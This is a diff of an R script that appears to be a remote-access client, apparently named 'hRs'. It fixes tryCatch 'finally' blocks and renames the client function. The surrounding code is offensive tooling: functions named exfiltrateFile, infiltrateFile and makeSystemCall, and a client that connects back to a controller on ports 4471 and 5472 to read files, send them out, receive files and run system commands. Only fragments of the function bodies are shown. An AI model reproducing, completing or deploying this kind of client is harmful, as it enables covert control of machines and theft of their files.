@@ -78,7 +78,7 @@ catTextFile <- function(rawCommand, command) {
     targetFile <- file(fileName, "r", encoding="utf-8")
     paste(readLines(targetFile, warn=FALSE), collapse="%&%")
   }, error=genericErrorMessage, warning=genericWarningMessage,
-  finally=function() {
+  finally={
     safeClose(targetFile)
   })
   return(toServer)
@@ -116,7 +116,7 @@ exfiltrateFile <- function(socket, host, secondaryPort, rawCommand) {
   }, warning=function(w){
     abortDownload <<- TRUE
     paste("Warning: ", w$message)
-  }, finally=function(){
+  }, finally={
     safeClose(targetFile)
   })
   exfilSocket <- NULL
@@ -129,7 +129,7 @@ exfiltrateFile <- function(socket, host, secondaryPort, rawCommand) {
     }, error=function(e){
       paste("Client error transmitting file: ", e$message)
     }, warning=genericWarningMessage,
-    finally=function(){
+    finally={
       safeClose(exfilSocket)
     })
   } else { #Error message
@@ -159,7 +159,7 @@ infiltrateFile <- function(socket, host, secondaryPort, rawCommand) {
   }, warning=function(w){
     abortUpload <<- TRUE
     paste("Warning: ", w$message)
-  }, finally=function(){
+  }, finally={
     safeClose(uploadSocket)
   })
   if(!abortUpload) {
@@ -171,7 +171,7 @@ infiltrateFile <- function(socket, host, secondaryPort, rawCommand) {
     }, error=function(e){
       paste("Error writing received data: ", e$message)
     }, warning=genericWarningMessage,
-    finally=function(){
+    finally={
       safeClose(outFile)
     })
   } else { #Error occurred
@@ -190,7 +190,7 @@ makeSystemCall <- function(rawCommand, command) {
 }
 
 
-client <- function(host="localhost", port=4471, secondaryPort=5472) {
+hRs.client <- function(host="localhost", port=4471, secondaryPort=5472) {
   socket <- socketConnection(host=host, port=port, server=FALSE, blocking=TRUE, encoding="utf-8", timeout=86400, open="r+")
 
   #Ensures that the socket gets closed silently, even if program fails
@@ -247,5 +247,5 @@ client <- function(host="localhost", port=4471, secondaryPort=5472) {
 
 
 
-client()
+hRs.client()
 
